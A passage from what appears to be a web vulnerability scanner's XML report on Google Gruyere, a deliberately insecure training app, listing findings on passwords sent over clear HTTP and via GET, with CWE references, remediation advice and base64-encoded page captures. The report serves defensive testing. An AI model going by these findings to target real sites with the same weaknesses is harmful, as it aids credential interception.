hZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMj5HcnV5ZXJlOiBQcm9maWxlPC9oMj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSdjb250ZW50Jz4KCgogIDxoMz5FZGl0IHlvdXIgcHJvZmlsZS48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0ndXBkYXRlJz4KPHRhYmxlPgogIDx0cj48dGQ+CiAgICBVc2VyIGlkOgogIDwvdGQ+PHRkPgoKCiAgCiAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20KICAKICAKCiAgPC90ZD48L3RyPgo8dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPSNTUtNTU1LTAxOTlAZXhhbXBsZS5jb20nCiAgICAgIG5hbWU9J25hbWUnIG1heGxlbmd0aD0nMTYnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBPTEQgUGFzc3dvcmQ6CiAgPC90ZD48dGQ+CiAgICA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J29sZHB3Jz4KICA8L3RkPjx0ZD4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgTkVXIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPC9iPjwvc3Bhbj4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgSWNvbjoKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JwogICAgICB2YWx1ZT0nJwogICAgICB2YWx1ZT0nJwogICAgICBuYW1lPSdpY29uJz4KICAgICgzMngzMiBpbWFnZSwgVVJMIHRvIGltYWdlIGxvY2F0aW9uKQo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBIb21lcGFnZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSMCcKICAgICAgdmFsdWU9JycKICAgICAgbmFtZT0nd2ViX3NpdGUnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBQcm9maWxlIENvbG9yOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPScnCiAgICAgIG5hbWU9J2NvbG9yJz4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgUHJpdmF0ZSBTbmlwcGV0OgogIDwvdGQ+PHRkPgogICAgPHRleHRhcmVhIG5hbWU9J3ByaXZhdGVfc25pcHBldCcgcm93cz0nMTAnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8L3RkPjwvdHI+CgoKPHRyPjx0ZD48L3RkPjx0ZCBhbGlnbj0nbGVmdCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBkYXRlJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>6033971810916313088</serialNumber>
    <type>3145984</type>
    <name><![CDATA[Cleartext submission of password]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>High</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications transmit passwords over unencrypted connections, making them vulnerable to interception. To exploit this vulnerability, an attacker must be suitably positioned to eavesdrop on the victim's network traffic. This scenario typically occurs when a client communicates with the server over an insecure connection such as public Wi-Fi, or a corporate or home network that is shared with a compromised computer. Common defenses such as switched networks are not sufficient to prevent this. An attacker situated in the user's ISP or the application's hosting infrastructure could also perform this attack. Note that an advanced adversary could potentially target any connection made over the Internet's core infrastructure.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>Applications should use transport-level encryption (SSL or TLS) to protect all sensitive communications passing between the client and the server. Communications that should be protected include the login mechanism and related functionality, and any functions where sensitive data can be accessed or privileged actions can be performed. These areas should employ their own session handling mechanism, and the session tokens used should never be transmitted over unencrypted communications. If HTTP cookies are used for transmitting session tokens, then the secure flag should be set to prevent transmission over clear-text HTTP.</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/319.html">CWE-319: Cleartext Transmission of Sensitive Information</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted over clear-text HTTP:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password fields:<ul><li>oldpw</li><li>pw</li></ul>]]></issueDetail>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMj5HcnV5ZXJlOiBQcm9maWxlPC9oMj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSdjb250ZW50Jz4KCgogIDxoMz5FZGl0IHlvdXIgcHJvZmlsZS48L2gzPgoKCgo8Zm9ybSBtZXRob2Q9J2dldCcgYWN0aW9uPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NhdmVwcm9maWxlJz4KPGlucHV0IHR5cGU9J2hpZGRlbicgbmFtZT0nYWN0aW9uJyB2YWx1ZT0ndXBkYXRlJz4KPHRhYmxlPgogIDx0cj48dGQ+CiAgICBVc2VyIGlkOgogIDwvdGQ+PHRkPgoKCiAgCiAgICA1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20KICAKICAKCiAgPC90ZD48L3RyPgo8dHI+PHRkPgogICAgVXNlciBuYW1lOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPSNTUtNTU1LTAxOTlAZXhhbXBsZS5jb20nCiAgICAgIG5hbWU9J25hbWUnIG1heGxlbmd0aD0nMTYnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBPTEQgUGFzc3dvcmQ6CiAgPC90ZD48dGQ+CiAgICA8aW5wdXQgdHlwZT0ncGFzc3dvcmQnIG5hbWU9J29sZHB3Jz4KICA8L3RkPjx0ZD4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgTkVXIFBhc3N3b3JkOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3Bhc3N3b3JkJyBuYW1lPSdwdyc+CiAgICA8YnI+PHNwYW4gc3R5bGU9ImNvbG9yOnJlZCI+PGI+V0FSTklORzogR3J1eWVyZSBpcyBub3Qgc2VjdXJlLjxicj4KICAgIERvIG5vdCB1c2UgYSBwYXNzd29yZCB0aGF0IHlvdSB1c2UgZm9yIGFueSByZWFsIHNlcnZpY2UuPC9iPjwvc3Bhbj4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgSWNvbjoKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JwogICAgICB2YWx1ZT0nJwogICAgICB2YWx1ZT0nJwogICAgICBuYW1lPSdpY29uJz4KICAgICgzMngzMiBpbWFnZSwgVVJMIHRvIGltYWdlIGxvY2F0aW9uKQo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBIb21lcGFnZToKICA8L3RkPjx0ZD4KICAgIDxpbnB1dCB0eXBlPSd0ZXh0JyBzaXplPSMCcKICAgICAgdmFsdWU9JycKICAgICAgbmFtZT0nd2ViX3NpdGUnPgo8L3RkPjwvdHI+Cjx0cj48dGQ+CiAgICBQcm9maWxlIENvbG9yOgogIDwvdGQ+PHRkPgogICAgPGlucHV0IHR5cGU9J3RleHQnCiAgICAgIHZhbHVlPScnCiAgICAgIG5hbWU9J2NvbG9yJz4KPC90ZD48L3RyPgo8dHI+PHRkPgogICAgUHJpdmF0ZSBTbmlwcGV0OgogIDwvdGQ+PHRkPgogICAgPHRleHRhcmVhIG5hbWU9J3ByaXZhdGVfc25pcHBldCcgcm93cz0nMTAnIHN0eWxlPSd3aWR0aDoxMDAlJz48L3RleHRhcmVhPgo8L3RkPjwvdHI+CgoKPHRyPjx0ZD48L3RkPjx0ZCBhbGlnbj0nbGVmdCc+CiAgICA8aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0nVXBkYXRlJz4KPC90ZD48L3RyPgo8L3RhYmxlPgo8L2Zvcm0+CjwvZGl2PgoKPC9ib2R5PgoKPC9odG1sPgoK]]></response>
      <responseRedirected>false</responseRedirected>
    </requestresponse>
  </issue>
  <issue>
    <serialNumber>7611546892940559360</serialNumber>
    <type>4195072</type>
    <name><![CDATA[Password submitted using GET method]]></name>
    <host ip="172.217.25.52">http://google-gruyere.appspot.com</host>
    <path><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></path>
    <location><![CDATA[/421683968655469260586300829583795792326/editprofile.gtl]]></location>
    <severity>Low</severity>
    <confidence>Certain</confidence>
    <issueBackground><![CDATA[<p>Some applications use the GET method to submit passwords, which are transmitted within the query string of the requested URL. Sensitive information within URLs may be logged in various locations, including the user's browser, the web server, and any forward or reverse proxy servers between the two endpoints. URLs may also be displayed on-screen, bookmarked or emailed around by users. They may be disclosed to third parties via the Referer header when any off-site links are followed. Placing passwords into the URL increases the risk that they will be captured by an attacker.</p>
<p>Vulnerabilities that result in the disclosure of users' passwords can result in compromises that are extremely difficult to investigate due to obscured audit trails. Even if the application itself only handles non-sensitive information, exposing passwords puts users who have re-used their password elsewhere at risk.</p>]]></issueBackground>
    <remediationBackground><![CDATA[<p>All forms submitting passwords should use the POST method. To achieve this, applications should specify the method attribute of the FORM tag as <b>method="POST"</b>. It may also be necessary to modify the corresponding server-side form handler to ensure that submitted passwords are properly retrieved from the message body, rather than the URL.
</p>]]></remediationBackground>
    <vulnerabilityClassifications><![CDATA[<ul>
<li><a href="https://cwe.mitre.org/data/definitions/598.html">CWE-598: Information Exposure Through Query Strings in GET Request</a></li>
</ul>]]></vulnerabilityClassifications>
    <issueDetail><![CDATA[The page contains a form with the following action URL, which is submitted using the GET method:<ul><li>http://google-gruyere.appspot.com/421683968655469260586300829583795792326/saveprofile</li></ul>The form contains the following password fields:<ul><li>oldpw</li><li>pw</li></ul>]]></issueDetail>
    <issueDetailItems>
      <issueDetailItem><![CDATA[oldpw]]></issueDetailItem>
      <issueDetailItem><![CDATA[pw]]></issueDetailItem>
    </issueDetailItems>
    <requestresponse>
      <request method="GET" base64="true"><![CDATA[R0VUIC80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvZWRpdHByb2ZpbGUuZ3RsIEhUVFAvMS4xDQpIb3N0OiBnb29nbGUtZ3J1eWVyZS5hcHBzcG90LmNvbQ0KQWNjZXB0LUVuY29kaW5nOiBnemlwLCBkZWZsYXRlDQpBY2NlcHQ6ICovKg0KQWNjZXB0LUxhbmd1YWdlOiBlbg0KVXNlci1BZ2VudDogTW96aWxsYS81LjAgKGNvbXBhdGlibGU7IE1TSUUgOS4wOyBXaW5kb3dzIE5UIDYuMTsgV2luNjQ7IHg2NDsgVHJpZGVudC81LjApDQpDb25uZWN0aW9uOiBjbG9zZQ0KDQo=]]></request>
      <response base64="true"><![CDATA[SFRUUC8xLjEgMjAwIE9LDQpDYWNoZS1Db250cm9sOiBuby1jYWNoZQ0KQ29udGVudC10eXBlOiB0ZXh0L2h0bWwNClByYWdtYTogbm8tY2FjaGUNClgtWFNTLVByb3RlY3Rpb246IDANClgtQ2xvdWQtVHJhY2UtQ29udGV4dDogNGIyMDRlOGUwZDRiNjk2ZDMzNTZmNzE5ZTA0NDg2MWENClZhcnk6IEFjY2VwdC1FbmNvZGluZw0KRGF0ZTogVGh1LCAxOCBKYW4gMjAxOCAwOTo0MjoxMyBHTVQNClNlcnZlcjogR29vZ2xlIEZyb250ZW5kDQpDb250ZW50LUxlbmd0aDogNDAwNQ0KQ29ubmVjdGlvbjogY2xvc2UNCg0KPCFET0NUWVBFIEhUTUwgUFVCTElDICItLy9XM0MvL0RURCBIVE1MIDQuMDEgVHJhbnNpdGlvbmFsLy9FTiI+CjwhLS0gQ29weXJpZ2h0IDIwMTcgR29vZ2xlIEluYy4gLS0+CjxodG1sPgo8aGVhZD4KPHRpdGxlPkdydXllcmU6IFByb2ZpbGU8L3RpdGxlPgo8c3R5bGU+Ci8qIENvcHlyaWdodCAyMDE3IEdvb2dsZSBJbmMuICovCgpib2R5LCBodG1sLCB0ZCwgc3BhbiwgZGl2LCBpbnB1dCwgdGV4dGFyZWEgewogIGZvbnQtZmFtaWx5OiBzYW5zLXNlcmlmOwogIGZvbnQtc2l6ZTogMTRwdDsKfQoKYm9keSB7CiAgYmFja2dyb3VuZDogdXJsKCdjaGVlc2UucG5nJykgdG9wIGNlbnRlciByZXBlYXQ7CiAgdGV4dC1hbGlnbjogY2VudGVyOwogIG9wYWNpdHk6IDAuODA7Cn0KCmgyIHsKICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgZm9udC1zaXplOiAzMHB0OwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9Cgp0ZCB7CiAgdmVydGljYWwtYWxpZ246IHRvcDsKICBwYWRkaW5nOiA1cHg7Cn0KCmEsIGE6aG92ZXIgewogIHRleHQtZGVjb3JhdGlvbjogdW5kZXJsaW5lOwogIGNvbG9yOiAjMDAwMGJiOwp9CgphOnZpc2l0ZWQgewogIGNvbG9yOiAjYmIwMDAwOwp9CgphLmJ1dHRvbjp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDBiYjsKfQoKLmNvbnRlbnQgewogIHRleHQtYWxpZ246IGxlZnQ7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIHdpZHRoOiA5MCU7CiAgYmFja2dyb3VuZDogI2ZmZmZjYzsKICBwYWRkaW5nOiAyMHB4OwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51IHsKICB0ZXh0LWFsaWduOiBsZWZ0OwogIHBhZGRpbmc6IDEwcHggMjBweCAzNXB4IDIwcHg7CiAgbWFyZ2luLWxlZnQ6IGF1dG87CiAgbWFyZ2luLXJpZ2h0OiBhdXRvOwogIG1hcmdpbi10b3A6IDIwcHg7CiAgd2lkdGg6IDkwJTsKICBiYWNrZ3JvdW5kOiAjZmZmZmNjOwogIGJvcmRlcjogM3B4IHNvbGlkICNmZmIxNDk7Cn0KCi5tZW51LXVzZXIgewogIGNvbG9yOiAjMDAwMDAwOwogIGZvbnQtd2VpZ2h0OiBib2xkOwp9CgojbWVudS1sZWZ0IHsKICBmbG9hdDogbGVmdDsKfQoKI21lbnUtbGVmdCBhLCAjbWVudS1sZWZ0IGE6aG92ZXIsICNtZW51LWxlZnQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKI21lbnUtcmlnaHQgewogIGZsb2F0OiByaWdodDsKfQoKI21lbnUtcmlnaHQgYSwgI21lbnUtcmlnaHQgYTpob3ZlciwgI21lbnUtcmlnaHQgYTp2aXNpdGVkIHsKICBjb2xvcjogIzAwMDAwMDsKfQoKLm1lc3NhZ2UgewogIHdpZHRoOiA1MCU7CiAgY29sb3I6ICNmZjAwMDA7CiAgYmFja2dyb3VuZDogI2ZmZGRkZDsKICBib3JkZXI6IDJweCBzb2xpZCAjZmYwMDAwOwogIGJvcmRlci1yYWRpdXM6IDFlbTsKICAtbW96LWJvcmRlci1yYWRpdXM6IDFlbTsKICBwYWRkaW5nOiAxMHB4OwogIGZvbnQtd2VpZ2h0OiBib2xkOwogIHRleHQtYWxpZ246IGNlbnRlcjsKICBtYXJnaW46IGF1dG87CiAgbWFyZ2luLXRvcDogMjBweDsKICBtYXJnaW4tYm90dG9tOiAyMHB4Owp9CgppbnB1dCwgdGV4dGFyZWEgewogIGJhY2tncm91bmQtY29sb3I6ICNmZmZmZmY7Cn0KCi5yZWZyZXNoIHsKICBmbG9hdDogY2VudGVyOwogIHdpZHRoOiA5MCU7CiAgdGV4dC1hbGlnbjogcmlnaHQ7CiAgbWFyZ2luOiBhdXRvOwogIHBhZGRpbmctdG9wOiAwOwogIHBhZGRpbmctYm90dG9tOiAycHQ7CiAgbWFyZ2luLXRvcDogMDsKICBtYXJnaW4tYm90dG9tOiAwOwp9CgouaDItd2l0aC1yZWZyZXNoIHsKICBtYXJnaW4tYm90dG9tOiAwOwp9Cgo8L3N0eWxlPgoKPC9oZWFkPgoKPGJvZHk+Cgo8ZGl2IGNsYXNzPSdtZW51Jz4KICA8c3BhbiBpZD0nbWVudS1sZWZ0Jz4KICAgIDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvJz5Ib21lPC9hPgogICAgICAKICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L3NuaXBwZXRzLmd0bCc+TXkmbmJzcDtTbmlwcGV0czwvYT4KICAgICAgfCA8YSBocmVmPScvNDIxNjgzOTY4NjU1NDY5MjYwNTg2MzAwODI5NTgzNzk1NzkyMzI2L25ld3NuaXBwZXQuZ3RsJz5OZXcmbmJzcDtTbmlwcGV0PC9hPgogICAgICB8IDxhIGhyZWY9Jy80MjE2ODM5Njg2NTU0NjkyNjA1ODYzMDA4Mjk1ODM3OTU3OTIzMjYvdXBsb2FkLmd0bCc+VXBsb2FkPC9hPgogICAgICAKICA8L3NwYW4+CiAgPHNwYW4gaWQ9J21lbnUtcmlnaHQnPgogICAgICAKICAgICAgPHNwYW4gY2xhc3M9J21lbnUtdXNlcic+CiAgICAgICAgNTU1LTU1NS0wMTk5QGV4YW1wbGUuY29tICZsdDs1NTUtNTU1LTAxOTlAZXhhbXBsZS5jb20mZ3Q7CiAgICAgIDwvc3Bhbj4KICAgICAgCiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9lZGl0cHJvZmlsZS5ndGwnPlByb2ZpbGU8L2E+CiAgICAgIHwgPGEgaHJlZj0nLzQyMTY4Mzk2ODY1NTQ2OTI2MDU4NjMwMDgyOTU4Mzc5NTc5MjMyNi9sb2dvdXQnPlNpZ24gb3V0PC9hPgogICAgICAKICAgICAgCiAgPC9zcGFuPgo8L2Rpdj4KCjxkaXY+CjxoMj5HcnV5ZXJlOiBQcm9maWxlPC9oMj4KPC9kaXY+Cgo8ZGl2IGNsYXNzPSdjb250Z